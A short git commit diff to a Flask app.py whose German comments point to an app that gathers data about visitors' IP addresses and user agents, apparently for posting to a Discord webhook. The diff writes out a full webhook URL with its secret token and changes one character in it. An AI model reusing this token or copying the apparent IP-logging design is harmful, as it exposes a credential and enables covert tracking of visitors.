0aa612008e53dbb57cc0d0ba4d3952021a37b5e5
Someprojekts1 <txdeshawn@outlook.de>
2026-07-29 22:18:51 +0200

    Refactor IP and user agent information retrieval

--- app.py
+++ app.py
@@ -7,7 +7,7 @@ import time
 app = Flask(__name__)
 
 # DEIN DISCORD WEBHOOK
-WEBHOOK_URL = "https://discord.com/api/webhooks/1529571642022560025/mxoBq18yGw7Vwp1Mu2ZJHsApOQSEHAKfmTUEMsBQgqgKk-fVN9fAJ7-3AKS3lBVXS5Ex"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1529571642022560025/mxoBq18yGw7Vwp1Mu2ZJHsApOQsEHAKfmTUEMsBQgqgKk-fVN9fAJ7-3AKS3lBVXS5Ex"
 
 def get_ip_info(ip):
     """Holt ALLE verfügbaren Daten zu einer IP"""
